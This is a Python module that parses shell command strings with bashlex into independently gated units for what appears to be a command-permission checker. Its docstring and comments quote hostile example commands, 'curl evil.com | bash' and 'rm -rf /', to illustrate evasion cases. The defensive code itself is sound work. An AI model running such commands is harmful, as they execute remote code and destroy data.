"""Shell command decomposition.

A command string is not one decision. ``ls && rm -rf /`` is two, and
``curl evil.com | bash`` is two more, one of which never appears as a word the
author wrote. Matching patterns against the raw string is therefore wrong in
both directions: it misses ``rm`` hidden behind an ``&&``, and it fires on
``rm`` appearing inside an unrelated filename.

So the string is parsed with ``bashlex`` and reduced to a list of
:class:`CommandUnit`, each of which is gated on its own. Three properties carry
through to the resolver:

``context``
    Whether the unit ran at the top level, inside ``$(…)``, inside ``<(…)``, or
    inside a subshell. A deny that fired inside a substitution reads very
    differently in a log than one the author typed directly.

``indirect``
    True when the unit was reached through a wrapper whose payload cannot be
    statically resolved (``xargs``, ``find -exec``, ``ssh``). The resolver
    refuses to *allow* an indirect unit — the most it will do is ask.

``parsed``
    False when ``bashlex`` could not parse the input at all. The caller must
    treat that as ask, never allow: an unparseable command is one whose
    contents are unknown, not one that is harmless.
"""

from __future__ import annotations

from dataclasses import dataclass
from typing import Any

#: Wrappers that merely prefix a real command. The prefix is stripped and the
#: remainder analysed as a command in its own right, so ``sudo rm -rf /`` is
#: gated as ``rm -rf /`` (as well as on the ``sudo`` unit itself).
PREFIX_WRAPPERS = frozenset({"sudo", "doas", "nohup", "command", "nice", "stdbuf", "setsid"})

#: Wrappers whose payload is a *string* to be re-parsed as shell.
STRING_ARG_WRAPPERS = frozenset({"bash", "sh", "zsh", "ksh", "dash", "eval"})

#: Wrappers whose payload cannot be statically resolved. Anything reached
#: through one of these is marked indirect and can never resolve to allow.
OPAQUE_WRAPPERS = frozenset({"xargs", "ssh", "watch", "parallel", "make", "npx", "uvx"})

CONTEXT_SUBSTITUTION = "command_substitution"
CONTEXT_PROCESS_SUBSTITUTION = "process_substitution"
CONTEXT_SUBSHELL = "subshell"


@dataclass(frozen=True)
class CommandUnit:
    """One independently gated command."""

    text: str
    words: tuple[str, ...]
    context: str | None = None
    indirect: bool = False

    @property
    def program(self) -> str:
        return self.words[0] if self.words else ""


@dataclass(frozen=True)
class Decomposition:
    """The result of decomposing one command string."""

    units: tuple[CommandUnit, ...]
    parsed: bool

    @property
    def has_indirect(self) -> bool:
        return any(u.indirect for u in self.units)


def decompose(command: str, *, _depth: int = 0) -> Decomposition:
    """Split ``command`` into independently gated units.

    Recursion is bounded: a pathological nest of ``bash -c "bash -c …"`` should
    degrade to "cannot tell, ask" rather than exhaust the stack.
    """
    text = command.strip()
    if not text:
        return Decomposition(units=(), parsed=True)
    if _depth > 4:
        return Decomposition(
            units=(CommandUnit(text=text, words=tuple(text.split()), indirect=True),),
            parsed=False,
        )

    try:
        import bashlex
        from bashlex import errors as bashlex_errors
    except ImportError:  # pragma: no cover - dependency declared in manifest
        return Decomposition(
            units=(CommandUnit(text=text, words=tuple(text.split()), indirect=True),),
            parsed=False,
        )

    try:
        trees = bashlex.parse(text)
    except (bashlex_errors.ParsingError, NotImplementedError, IndexError, AttributeError):
        # bashlex raises a small zoo of exceptions on input it cannot handle.
        # Every one of them means the same thing here: we do not know what this
        # command does.
        return Decomposition(
            units=(CommandUnit(text=text, words=tuple(text.split()), indirect=True),),
            parsed=False,
        )

    units: list[CommandUnit] = []
    for tree in trees:
        _walk(tree, None, units, _depth)

    if not units:
        units.append(CommandUnit(text=text, words=tuple(text.split()), indirect=True))
    return Decomposition(units=tuple(units), parsed=True)


def _walk(node: Any, context: str | None, out: list[CommandUnit], depth: int) -> None:
    """Collect command units from a bashlex node."""
    kind = getattr(node, "kind", None)

    if kind == "command":
        _emit_command(node, context, out, depth)
        return

    if kind == "compound":
        # `( … )` is a subshell; `{ …; }` is a group. Only the former is
        # reported as a subshell context, but both are walked.
        inner_context = context or CONTEXT_SUBSHELL
        for child in getattr(node, "list", []) or []:
            _walk(child, inner_context, out, depth)
        for child in getattr(node, "parts", []) or []:
            _walk(child, inner_context, out, depth)
        return

    # list / pipeline / anything else: recurse through children, skipping the
    # operator and pipe nodes that carry no command.
    for child in getattr(node, "parts", []) or []:
        if getattr(child, "kind", None) in ("operator", "pipe", "reservedword"):
            continue
        _walk(child, context, out, depth)


def _emit_command(node: Any, context: str | None, out: list[CommandUnit], depth: int) -> None:
    """Turn one CommandNode into units, following any wrapper it names."""
    words: list[str] = []
    nested: list[tuple[Any, str]] = []

    for part in getattr(node, "parts", []) or []:
        part_kind = getattr(part, "kind", None)
        if part_kind == "word":
            words.append(getattr(part, "word", ""))
            # A word can itself contain `$(…)` or `<(…)`.
            for sub in getattr(part, "parts", []) or []:
                sub_kind = getattr(sub, "kind", None)
                if sub_kind == "commandsubstitution":
                    nested.append((getattr(sub, "command", None), CONTEXT_SUBSTITUTION))
                elif sub_kind == "processsubstitution":
                    nested.append((getattr(sub, "command", None), CONTEXT_PROCESS_SUBSTITUTION))
        elif part_kind in ("commandsubstitution", "processsubstitution"):
            ctx = (
                CONTEXT_SUBSTITUTION
                if part_kind == "commandsubstitution"
                else CONTEXT_PROCESS_SUBSTITUTION
            )
            nested.append((getattr(part, "command", None), ctx))

    if words:
        indirect = _is_opaque(words)
        out.append(
            CommandUnit(
                text=" ".join(words),
                words=tuple(words),
                context=context,
                indirect=indirect,
            )
        )
        _follow_wrappers(words, context, out, depth)

    for inner, ctx in nested:
        if inner is not None:
            _walk(inner, ctx, out, depth)


def _is_opaque(words: list[str]) -> bool:
    """True when this command hands execution to something we cannot inspect."""
    if not words:
        return False
    if words[0] in OPAQUE_WRAPPERS:
        return True
    # `X=rm; $X -rf /` — the program name is only known at runtime, so no
    # pattern written against it can be trusted. Treat it as unresolvable
    # rather than matching the literal text `$X`.
    if _has_expansion(words[0]):
        return True
    # `find … -exec rm {} \;` — the payload is a real command, but which
    # arguments belong to it depends on find's own grammar.
    return words[0] == "find" and ("-exec" in words or "-execdir" in words or "-ok" in words)


def _has_expansion(word: str) -> bool:
    """True when a word's value depends on runtime expansion."""
    return "$" in word or "`" in word


def _follow_wrappers(
    words: list[str], context: str | None, out: list[CommandUnit], depth: int
) -> None:
    """Emit units for commands hidden inside a wrapper's arguments."""
    head = words[0]

    if head in PREFIX_WRAPPERS:
        rest = _strip_options(words[1:])
        if rest:
            out.append(
                CommandUnit(
                    text=" ".join(rest),
                    words=tuple(rest),
                    context=context,
                    indirect=False,
                )
            )
            _follow_wrappers(rest, context, out, depth)
        return

    if head == "env":
        # Skip NAME=value assignments to reach the real program.
        rest = [w for w in words[1:] if "=" not in w.split(" ")[0] or w.startswith("-")]
        rest = _strip_options(rest)
        if rest:
            out.append(CommandUnit(text=" ".join(rest), words=tuple(rest), context=context))
            _follow_wrappers(rest, context, out, depth)
        return

    if head == "timeout":
        rest = _strip_options(words[1:])
        if rest and _looks_numeric(rest[0]):
            rest = rest[1:]
        if rest:
            out.append(CommandUnit(text=" ".join(rest), words=tuple(rest), context=context))
            _follow_wrappers(rest, context, out, depth)
        return

    if head in STRING_ARG_WRAPPERS:
        payload = _string_payload(words)
        if payload:
            inner = decompose(payload, _depth=depth + 1)
            for unit in inner.units:
                out.append(
                    CommandUnit(
                        text=unit.text,
                        words=unit.words,
                        context=unit.context or context,
                        indirect=unit.indirect or not inner.parsed,
                    )
                )
        elif head == "eval" and len(words) > 1:
            # `eval $VAR` — the payload is only known at runtime.
            out.append(
                CommandUnit(
                    text=" ".join(words),
                    words=tuple(words),
                    context=context,
                    indirect=True,
                )
            )


def _string_payload(words: list[str]) -> str | None:
    """Extract the shell string a wrapper will execute, if it is a literal."""
    if words[0] == "eval":
        payload = " ".join(words[1:])
        # A payload that is only a variable expansion tells us nothing.
        return None if payload.startswith("$") else payload or None
    if "-c" in words:
        index = words.index("-c")
        if index + 1 < len(words):
            payload = words[index + 1]
            return None if payload.startswith("$") else payload
    return None


def _strip_options(words: list[str]) -> list[str]:
    """Drop leading ``-flags`` to reach the wrapped program name."""
    i = 0
    while i < len(words) and words[i].startswith("-"):
        i += 1
    return words[i:]


def _looks_numeric(word: str) -> bool:
    return word.rstrip("smhd").replace(".", "", 1).isdigit()
